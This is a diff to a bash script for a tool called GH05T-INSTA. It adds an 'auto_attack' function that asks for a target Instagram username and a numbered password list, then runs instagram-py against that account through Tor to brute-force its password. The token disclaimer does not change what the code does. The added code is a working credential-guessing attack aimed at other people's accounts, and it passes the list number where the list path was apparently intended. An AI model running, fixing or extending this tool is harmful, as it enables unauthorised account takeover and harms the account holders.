@@ -1,6 +1,7 @@
 #!/bin/env bash
 
 tornotice() {
+	clear
 	echo -e "\033[1;37m +----------------------------------------------+"
 	echo -e "\033[1;37m |              \033[0;31m       Tor                   \033[1;37m   |"
 	echo -e "\033[1;37m |\033[0;32mIt is an acronym for Onion Router, a free and\033[1;37m |"
@@ -81,7 +82,7 @@ check_updates() {
 	fi
 }
 
-function auto_attack () {
+function auto_attack() {
 #	tornotice
 	banners
 	echo -e " \033[1;37m | \033[1;37m[\033[0;31m××\033[1;37m]\033[0;32m Lines  Password type                  \033[1;37m  |"
@@ -108,9 +109,74 @@ function auto_attack () {
 	echo -e " \033[1;37m +----------------------------------------------+"
 	read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter Username : \e[0m' username
 	read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter Pssword Type : \e[0m' passnum
-
+	if [ -z $passnum ]; then
+		echo -e "${white}  [${red}++${white}] ${red}Invalid Option, Try Again..."
+		sleep 2
+		auto_attack
+	elif [ $passnum = "01" ] || [ $passnum = "1" ]; then
+		passwordtype="/usr/cookies/password-1.txt"
+	elif [ $passnum = "02" ] || [ $passnum = "2" ]; then
+		passwordtype="/usr/cookies/password-2.txt"
+	elif [ $passnum = "03" ] || [ $passnum = "3" ]; then
+		passwordtype="/usr/cookies/password-3.txt"
+	elif [ $passnum = "04" ] || [ $passnum = "4" ]; then
+		passwordtype="/usr/cookies/password-4.txt"
+	elif [ $passnum = "05" ] || [ $passnum = "5" ]; then
+		passwordtype="/usr/cookies/password-5.txt"
+	elif [ $passnum = "06" ] || [ $passnum = "6" ]; then
+		passwordtype="/usr/cookies/password-6.txt"
+	elif [ $passnum = "07" ] || [ $passnum = "7" ]; then
+		passwordtype="/usr/cookies/password-7.txt"
+	elif [ $passnum = "08" ] || [ $passnum = "8" ]; then
+		passwordtype="/usr/cookies/password-8.txt"
+	elif [ $passnum = "09" ] || [ $passnum = "9" ]; then
+		passwordtype="/usr/cookies/password-9.txt"
+	elif [ $passnum = "10" ]; then
+		passwordtype="/usr/cookies/password-10.txt"
+	elif [ $passnum = "11" ]; then
+		passwordtype="/usr/cookies/password-11.txt"
+	elif [ $passnum = "12" ]; then
+		passwordtype="/usr/cookies/password-12.txt"
+	elif [ $passnum = "13" ]; then
+		passwordtype="/usr/cookies/password-13.txt"
+	elif [ $passnum = "14" ]; then
+		passwordtype="/usr/cookies/password-14.txt"
+	elif [ $passnum = "15" ]; then
+		passwordtype="/usr/cookies/password-15.txt"
+	elif [ $passnum = "16" ]; then
+		passwordtype="/usr/cookies/password-16.txt"
+	elif [ $passnum = "17" ]; then
+		passwordtype="/usr/cookies/password-17.txt"
+	elif [ $passnum = "18" ]; then
+		passwordtype="/usr/cookies/password-18.txt"
+	elif [ $passnum = "19" ]; then
+		passwordtype="/usr/cookies/password-19.txt"
+	elif [ $passnum = "20" ]; then
+		passwordtype="/usr/cookies/password-20.txt"
+	else
+		echo -e "${white}  [${red}++${white}] ${red}Invalid Option, Try Again..."
+		sleep 2
+		auto_attack
+	fi
+	tornotice
+	clear
+	echo "User : $username" >> /usr/cookies/history.txt
+	echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
+	instagram-py --username $username --password-list $passnum
+	reopens
+	sleep 3
+	echo -e " \033[1;37m +----------------------------------------------+"
+	echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 3.01\033[1;37m|"
+	echo -e " \033[1;37m |\033[0;31m Powered  \033[1;37m :\033[0;34m Instagram-py    \033[0;31m  antony-jr\033[1;37m:\033[0;34m 2.07\033[1;37m|"
+	echo -e " \033[1;37m +----------------------------------------------+"
+	echo -e " \033[1;37m |              \033[0;31m     disclaimer   \033[1;37m              |"
+	echo -e " \033[1;37m |   We are not responsible if you misuse it    |"
+	echo -e " \033[1;37m |   Never use this tool to do illegal things   |"
+	echo -e " \033[1;37m +----------------------------------------------+"
+	sleep 10
+	exit
 }
-function banners () {
+function banners() {
 	internet_connection
 	clear
 	echo -e " \033[1;37m +----------------------------------------------+"
